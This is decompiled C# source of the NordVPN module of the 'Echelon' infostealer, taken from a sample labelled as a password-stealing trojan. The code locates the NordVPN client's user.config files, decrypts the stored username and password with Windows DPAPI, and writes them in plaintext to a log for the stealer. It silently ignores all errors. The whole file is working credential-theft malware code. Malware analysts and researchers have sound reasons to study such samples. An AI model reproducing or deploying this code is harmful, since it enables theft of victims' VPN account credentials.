// Decompiled with JetBrains decompiler
// Type: Echelon.NordVPN
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Echelon
{
  internal class NordVPN
  {
    public static int count = 0;
    public static string NordVPNDir = "\\Vpn\\NordVPN";

    public static void Start(string Echelon_Dir)
    {
      try
      {
        if (!Directory.Exists(Help.LocalData + "\\NordVPN\\"))
          return;
        Directory.CreateDirectory(Echelon_Dir + NordVPN.NordVPNDir);
        using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + NordVPN.NordVPNDir + "\\Account.log"))
        {
          DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Help.LocalData, nameof (NordVPN)));
          if (!directoryInfo.Exists)
            return;
          foreach (DirectoryInfo directory1 in directoryInfo.GetDirectories("NordVpn.exe*"))
          {
            foreach (DirectoryInfo directory2 in directory1.GetDirectories())
            {
              streamWriter.WriteLine("\tFound version " + directory2.Name);
              string str = Path.Combine(directory2.FullName, "user.config");
              if (File.Exists(str))
              {
                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.Load(str);
                string innerText1 = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
                string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
                if (innerText1 != null && !string.IsNullOrEmpty(innerText1))
                  streamWriter.WriteLine("\t\tUsername: " + NordVPN.Nord_Vpn_Decoder(innerText1));
                if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
                  streamWriter.WriteLine("\t\tPassword: " + NordVPN.Nord_Vpn_Decoder(innerText2));
                ++NordVPN.count;
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    public static string Nord_Vpn_Decoder(string s)
    {
      try
      {
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[]) null, DataProtectionScope.LocalMachine));
      }
      catch
      {
        return "";
      }
    }
  }
}
